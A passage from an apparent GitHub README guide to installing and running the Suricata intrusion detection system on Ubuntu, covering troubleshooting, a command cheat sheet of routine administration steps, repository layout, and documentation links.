Enable `community-id` (Section 7.3) so alerts correlate with Zeek, firewalls, and EDR data.

---

## 19. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `suricata.service` fails to start | Config error | `sudo suricata -T -c /etc/suricata/suricata.yaml -v` and read the message |
| No alerts at all | Wrong interface in `af-packet` | `ip -br a`, fix `interface:`, restart |
| No alerts at all | Rules did not load | `sudo suricata-update`, check `/var/lib/suricata/rules/suricata.rules` is not empty |
| `curl testmynids.org` shows no alert | Rules still loading, or ET Open not downloaded | Wait for `engine started` in `suricata.log`, re-run `suricata-update`, restart |
| Rule never fires | Wrong buffer or normalization | Replay a pcap, try `http.uri.raw`, check `flow` direction |
| `rules failed` on `-T` | Syntax error | Error message gives the file and line, often a missing `;` or unescaped `"` |
| Many `kernel_drops` | CPU/NIC too slow | See [Performance basics](#17-performance-basics) |
| Local rules not loaded | `local.rules` not in `rule-files:` | Add it ([Section 7.4](#74-load-your-own-rules-file)) |
| Lost SSH after IPS test | Queued all traffic | Queue only needed ports; remove `iptables` rules from console |
| Permission denied reading logs | Logs owned by root | Use `sudo`, or add your user to a log-reading group |

Handy debugging:

```bash
sudo journalctl -u suricata -n 50 --no-pager
sudo tail -n 50 /var/log/suricata/suricata.log
```

---

## 20. Command cheat sheet

```bash
# --- Install ---
sudo add-apt-repository -y ppa:oisf/suricata-stable && sudo apt update && sudo apt install -y suricata jq
suricata -V

# --- Config ---
sudo nano /etc/suricata/suricata.yaml        # HOME_NET, af-packet interface, rule-files
sudo suricata -T -c /etc/suricata/suricata.yaml -v

# --- Rules ---
sudo suricata-update
sudo suricatasc -c reload-rules

# --- Service ---
sudo systemctl enable --now suricata
sudo systemctl restart suricata
sudo journalctl -u suricata -n 50 --no-pager

# --- Alerts ---
sudo tail -f /var/log/suricata/fast.log
sudo jq -c 'select(.event_type=="alert")' /var/log/suricata/eve.json | tail

# --- Offline pcap test ---
suricata -c /etc/suricata/suricata.yaml -S my.rules -r attack.pcap -k none -l ./out && cat ./out/fast.log
```

---

## 21. Repository layout and contributing

Suggested layout for this series (one folder per tool):

```
.
├── README.md                  ← overview of all tools in the series
├── suricata/
│   ├── README.md              ← this guide
│   └── rules/
│       └── local.rules        ← lab rules used in Section 14
└── <next-tool>/
    └── README.md
```

Found a typo, a broken command, or a better rule? Open an **Issue** or a **Pull Request**. Please test commands on a clean Ubuntu VM before submitting.

---

## 22. References

- Suricata documentation: <https://docs.suricata.io/>
- Suricata rules guide: <https://docs.suricata.io/en/latest/rules/index.html>
- `suricata-update` docs: <https://suricata-update.readthedocs.io/>
- OISF PPA: <https://launchpad.net/~oisf/+archive/ubuntu/suricata-stable>
- Emerging Threats Open rules: <https://rules.emergingthreats.net/>

---

<div align="center">

### ⭐ If this guide helped you, star the repo and subscribe to **SEC W TOM** on YouTube.

**Learn - Secure - Grow**

*Educational use only. Use responsibly and legally.*

</div>
